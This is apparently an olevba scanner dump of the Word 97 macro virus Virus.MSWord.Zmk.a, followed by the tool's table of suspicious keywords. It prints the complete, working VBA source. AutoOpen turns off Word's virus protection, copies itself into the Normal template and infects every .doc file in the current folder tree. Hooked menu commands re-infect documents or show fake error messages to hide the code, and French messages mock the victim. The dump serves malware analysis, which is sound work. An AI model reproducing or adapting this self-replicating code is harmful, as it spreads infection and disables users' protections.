olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ZMK98FAV.bas 
in file: Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477 - OLE stream: 'Macros/VBA/ZMK98FAV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ZMK98FAV" Then
        ZMK98FAVInstalled = -1
    End If
Next i
If Not ZMK98FAVInstalled Then
    MsgBox "Je suis un nouveau AntiVirus pour Word 97", vbInformation, "ZMK98FAV"
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
    StatusBar = "Analyse du répertoire: " & CurDir & " pour trouver des fichier DOC..."
    For i = 1 To 500000
    Next i
    With Application.FileSearch
    If .Execute() > 0 Then
        .FileName = "*.doc"
        .LookIn = CurDir
        .SearchSubFolders = True
        For i = 1 To .FoundFiles.Count
            StatusBar = "Analyse de " & .FoundFiles(i) & " en cours..."
            Documents.Open FileName:=.FoundFiles(i)
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
            ActiveDocument.Save
            StatusBar = "Analyse de " & .FoundFiles(i) & " terminé..."
        Next i
        MsgBox "Analyse du répertoire " & CurDir & " terminé!!!" & Chr$(13) & "Les " & .FoundFiles.Count & " fichiers analysés sont infectés par moi" & Chr$(13) & "HAHAHAHAHA!!!!", vbCritical, "ZMK98FAV"
        StatusBar = "[ZMK98FAV] ZeMacroKiller98 Faux AntiVirus, HAHAHAHAHA!!!!"
        Application.Run MacroName:="FichierFermerTout"
    Else
        MsgBox "Pas de fichier DOC trouvé dans " & CurDir, vbInformation, "ZMK98FAV"
        MsgBox "Mais moi, je vous ai infecté..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
    End If
    End With
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98FAV", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ZMK98BM", Object:=wdOrganizerObjectProjectItems
MsgBox "Vous feriez mieux d'acheter un VRAI ANTIVIRUS..." & Chr$(13) & "HAHAHAHAHA!!!!!", vbCritical, "ZMK98FAV"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace Pile Insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    ZMK98BM.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ZMK98BM.frm 
in file: Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477 - OLE stream: 'Macros/VBA/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload ZMK98BM
End Sub

Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Je suis un Faux AntiVirus cr�e par ZeMacroKiller98A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tous les fichier DOC de votre disque sont infect�...I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J'esp�re que vous avez un VRAI ANTIVIRUS...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HAHAHAHAHA!!!!!!, que je suis dr�le, n'est ce pas ?...D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PERSONNE N'EST A L'ABRI DES VIRUS...�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Zmk.a-b253135019fe50778a79a70f1a2eb18006e6c477' - OLE stream: 'Macros/ZMK98BM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

